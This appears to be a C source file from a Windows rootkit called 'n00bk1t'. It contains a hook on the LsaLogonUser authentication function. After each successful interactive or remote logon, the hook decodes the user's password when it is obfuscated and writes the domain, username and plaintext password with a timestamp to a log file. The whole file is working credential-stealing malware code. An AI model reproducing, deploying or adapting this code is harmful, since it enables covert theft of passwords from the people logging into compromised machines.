#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include "ntdll.h"
#include <Ntsecapi.h> // -> using the one from lcc-win32

#include "lsalogonuser.h"
#include "misc.h"

extern CHAR n00bk1tLogFile[MAX_PATH+1];

void LogCredentials(LPSTR lpDomain,LPSTR lpUsername,LPSTR lpPassword)
{
	LPSTR lpLogBuffer;
	size_t stBufferLen;
	SYSTEMTIME stTime;
		
	// get time
	GetLocalTime(&stTime);

	stBufferLen=strlen(lpDomain)+strlen(lpUsername)+strlen(lpPassword)+
		+strlen("[00:00 00/00/0000] [Dom: (null)] [User: (null)] [Pass: (null)]\r\n");

	// alloc buffer
	lpLogBuffer=(LPSTR)GlobalAlloc(GPTR,stBufferLen+1);
	if (!lpLogBuffer)
		return;

	// build string
	_snprintf(lpLogBuffer,stBufferLen,"[%02d:%02d %02d/%02d/%04d] [Dom: %s] [User: %s] [Pass: %s]\r\n",
		stTime.wHour,stTime.wMinute,stTime.wDay,stTime.wMonth,stTime.wYear,
		lpDomain,lpUsername,lpPassword);

	// write to file
	misc_WriteDataToFile(n00bk1tLogFile,lpLogBuffer,strlen(lpLogBuffer)); 
							
	// free buffer
	GlobalFree(lpLogBuffer);
}

// secur32.LsaLogonUser
NTSTATUS WINAPI NewLsaLogonUser(
  HANDLE LsaHandle,
  PLSA_STRING OriginName,
  SECURITY_LOGON_TYPE LogonType,
  ULONG AuthenticationPackage,
  PVOID AuthenticationInformation,
  ULONG AuthenticationInformationLength,
  PTOKEN_GROUPS LocalGroups,
  PTOKEN_SOURCE SourceContext,
  PVOID* ProfileBuffer,
  PULONG ProfileBufferLength,
  PLUID LogonId,
  PHANDLE Token,
  PQUOTA_LIMITS Quotas,
  PNTSTATUS SubStatus
)
{
	NTSTATUS rc;
	PMSV1_0_INTERACTIVE_LOGON pMSV1_0_InteractiveLogon;
	UNICODE_STRING usDecodedPass;
	PWCHAR	pwDecodedString=NULL;
	ANSI_STRING asUsername;
	ANSI_STRING asPassword;
	ANSI_STRING asDomain;

	// call original function
	rc=OldLsaLogonUser(LsaHandle,OriginName,LogonType,AuthenticationPackage,AuthenticationInformation,AuthenticationInformationLength,
			LocalGroups,SourceContext,ProfileBuffer,ProfileBufferLength,LogonId,Token,Quotas,SubStatus);

	if (NT_SUCCESS(rc))
	{
		if (LogonType==Interactive||LogonType==RemoteInteractive)
		{
			pMSV1_0_InteractiveLogon=(PMSV1_0_INTERACTIVE_LOGON)AuthenticationInformation;

			// decode password (thx Ratter/29A)
			if (*(BYTE*)((char*)AuthenticationInformation+HASH_OFFSET)!=0)
			{
				// allocate buffer for encoded string
				pwDecodedString=(PWCHAR)misc_AllocBuffer((BYTE)pMSV1_0_InteractiveLogon->Password.Length);
				if (!pwDecodedString)
					return rc;

				// copy encoded password
				if (!NT_SUCCESS(RtlCopyMemory(pwDecodedString,pMSV1_0_InteractiveLogon->Password.Buffer,(BYTE)pMSV1_0_InteractiveLogon->Password.Length)))
					return rc;

				// init UNICODE_STRING
				usDecodedPass.Buffer=pwDecodedString;
				usDecodedPass.Length=(BYTE)pMSV1_0_InteractiveLogon->Password.Length;
				usDecodedPass.MaximumLength=(BYTE)pMSV1_0_InteractiveLogon->Password.Length;

				// decode and convert to ansi
				RtlRunDecodeUnicodeString(*(BYTE*)((char*)AuthenticationInformation+HASH_OFFSET),&usDecodedPass);
				RtlUnicodeStringToAnsiString(&asPassword,&usDecodedPass,TRUE);
			}
			else
				// plaintext so just convert to ansi
				RtlUnicodeStringToAnsiString(&asPassword,&pMSV1_0_InteractiveLogon->Password,TRUE);

			RtlUnicodeStringToAnsiString(&asUsername,&pMSV1_0_InteractiveLogon->UserName,TRUE);
			RtlUnicodeStringToAnsiString(&asDomain,&pMSV1_0_InteractiveLogon->LogonDomainName,TRUE);

			// Log credentials
			LogCredentials(asDomain.Buffer,asUsername.Buffer,asPassword.Buffer);

			// free buffers
			if (pwDecodedString) misc_FreeBuffer(&pwDecodedString);
			RtlFreeAnsiString(&asUsername);
			RtlFreeAnsiString(&asDomain);
			RtlFreeAnsiString(&asPassword);
		}
	}

	return rc;
}


